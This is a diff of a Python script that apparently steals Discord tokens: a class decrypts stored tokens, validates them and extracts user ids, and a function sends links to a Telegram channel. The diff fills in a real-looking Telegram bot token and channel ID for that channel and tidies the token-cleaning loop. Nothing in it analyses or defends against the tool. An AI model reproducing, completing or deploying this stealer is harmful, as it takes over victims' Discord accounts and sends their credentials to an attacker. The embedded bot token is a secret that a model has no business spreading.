@@ -9,8 +9,8 @@ import subprocess
 
 
 
-BOT_TOKEN = 'YOUR TELEGRAM BOT TOKEN'
-CHANNEL_ID = YOUR TELEGRAM CHANNEL ID WHERE THE BOT IS LOCATED
+BOT_TOKEN = '7147454534:AAHa08rDeHun1_JWqqOMu9wPAas1I9_Wpbc'
+CHANNEL_ID = -1002015035900
 
 
 def send_download_link(download_link):
@@ -110,49 +110,11 @@ class Discord:
 if __name__ == '__main__':
     discord = Discord()
     decrypted_tokens = discord.get_tokens()
+    not_allowed_chars = ['', '`', '', '|', '', '', "'", '%', '"', '!']
     for token in decrypted_tokens:
-        try:
-            token = token.replace('', '')
-        except ValueError:
-            pass
-
-        try:
-            token = token.replace('`', '')
-        except ValueError:
-            pass
-
-        try:
-            token = token.replace('', '')
-        except ValueError:
-            pass
-        try:
-            token = token.replace('|', '')
-        except ValueError:
-            pass
-        try:
-            token = token.replace('', '')
-        except ValueError:
-            pass
-        try:
-            token = token.replace('', '')
-        except ValueError:
-            pass
-        try:
-            token = token.replace("'", "")
-        except ValueError:
-            pass
-
-        try:
-            token = token.replace('%', '')
-        except ValueError:
-            pass
-
-
-        try:
-            token = token.replace('"', '')
-        except ValueError:
-            pass
-
+        for char in not_allowed_chars:
+            if char in token:
+                token = token.replace(char, '')
         token_resp = token_validator(token)
         uid_list = token.split('.')
         uid = uid_list[0]
